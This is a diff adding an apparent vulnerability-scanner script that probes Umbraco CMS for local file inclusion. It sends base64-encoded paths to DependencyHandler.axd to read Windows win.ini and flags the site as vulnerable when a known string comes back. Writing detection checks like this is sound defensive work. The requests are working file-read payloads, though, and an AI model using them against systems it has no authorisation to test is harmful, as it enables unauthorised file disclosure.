@@ -1,0 +1,59 @@
+#include helpers.inc;
+#include classMatches.inc;
+#include string_helpers.inc;
+#include reporting_helpers.inc;
+// **************************************************************************************
+function alert(fname, uri, matchedText)
+{
+    var ri = new TReportItem();
+    ri.LoadFromFile(fname);
+    ri.affects = uri;
+    ri.alertPath = "Scripts/" + fname;
+    ri.setHttpInfo(lastJob);
+    if (matchedText) {
+        ri.details = "Pattern: [dark][bold]" + matchedText + "[/dark][/bold]";
+    }
+    AddReportItem(ri);
+}
+// **************************************************************************************
+function TestLFI700(dir, fullPath)
+{
+    lastJob = new THTTPJob();
+    lastJob.url = dir.url;
+    lastJob.addCookies = false;
+    lastJob.verb = 'GET';
+    lastJob.URI = fullPath + 'DependencyHandler.axd?s=QzpcV2luZG93c1x3aW4uaW5p&t=CSS&cdv=1';
+    lastJob.execute();
+    var patternStr = ';for 16-bit app support';
+    if (!lastJob.wasError && lastJob.response.msg2 == 200 && lastJob.response.body.indexOf(patternStr) != -1)
+    {
+        alert('Umbraco_CMS_LFI_700.xml', lastJob.URI, patternStr);
+    }
+    return false;
+}
+// **************************************************************************************
+function TestLFI721(dir, fullPath)
+{
+    lastJob = new THTTPJob();
+    lastJob.url = dir.url;
+    lastJob.addCookies = false;
+    lastJob.verb = 'GET';
+    lastJob.URI = fullPath + 'DependencyHandler.axd?s=ZmlsZTovL2xvY2FsaG9zdC9jJC9XaW5kb3dzL3dpbi5pbmk=&t=CSS&cdv=1';
+    lastJob.execute();
+    var patternStr = ';for 16-bit app support';
+    if (!lastJob.wasError && lastJob.response.msg2 == 200 && lastJob.response.body.indexOf(patternStr) != -1)
+    {
+        alert('Umbraco_CMS_LFI_700.xml', lastJob.URI, patternStr);
+    }
+    return false;
+}
+/***********************************************************************************/
+/* main entry point */
+var lastJob = null;
+var dir = getCurrentDirectory();
+if (dir) {
+    var fullPath = dir.fullPath;
+    if (!fullPath.endsWith("/")) fullPath = fullPath + "/";
+    TestLFI700(dir, fullPath);
+    TestLFI721(dir, fullPath);
+}
